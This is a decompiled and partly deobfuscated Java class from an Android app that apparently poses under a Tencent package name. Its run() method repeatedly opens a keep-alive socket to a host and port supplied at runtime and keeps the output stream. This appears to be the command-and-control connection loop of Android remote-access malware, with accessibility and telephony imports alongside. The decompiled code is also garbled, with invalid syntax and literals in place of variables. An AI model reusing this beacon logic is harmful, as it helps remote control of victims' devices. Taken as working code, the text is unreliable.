package com.tencent;

import android.content.*;
import android.view.*;
import android.widget.*;
import android.app.*;
import android.os.*;
import android.accessibilityservice.*;
import android.view.accessibility.*;
import android.telephony.*;
import android.media.*;
import java.util.*;
import java.io.*;
import java.net.*;

/**
 * Deobfuscated class: SecondaryBackgroundService_1
 * Original: Lcom/tencent/tunesxconcerningn106$1;
 */
class SecondaryBackgroundService_1 implements Runnable; {

    // === FIELDS ===
    final SecondaryBackgroundService this$0;
    final String val$h;
    final int val$p;

    // === METHODS ===

     void Constructor(SecondaryBackgroundService param0, String param1, int param2) {
        v0.this$0 = v1;
        v0.val$h = v2;
        v0.val$p = v3;
        // new Object()
        return;
    }

    public void run() {
        v0 = 0;
        v1 = 0;
        v2 = 3;
        if (v1 < 3) { // goto +7
        3.sp();
        v3 = InetAddress.getByName(3);
        v3 = new InetSocketAddress();
        v4 = v6.val$p;
        // new InetSocketAddress(3, v4)
        // new Socket()
        SecondaryBackgroundService.s_tunesxconcerningn106_k = 3;
        3.setSoTimeout(0);
        v4 = 1;
        3.setKeepAlive(1);
        3.setTcpNoDelay(1);
        v5 = 60000;
        3.connect(v3, 60000);
        v3 = SecondaryBackgroundService.s_tunesxconcerningn106_k;
        v3 = v3.isConnected();
        3.ctd = v3;
        if (3 != 1) { // goto +37
        3.getOutputStream();
        SecondaryBackgroundService.o_tunesxconcerningn106_ut = 3;
        3.Lo = 1;
        3.p_tunesxconcerningn106_r();
        // goto (branch)
        SecondaryBackgroundService.access$000(3);
        // goto (branch)
        SecondaryBackgroundService.access$000(3);
        // goto (branch)
        SecondaryBackgroundService.access$000(3);
        v2 = 1;
        Thread.sleep(1, v3);
        v1 = v1 + 1;
        if (1 == null || 1 == 0) { // goto +-114
        return;
    }
}
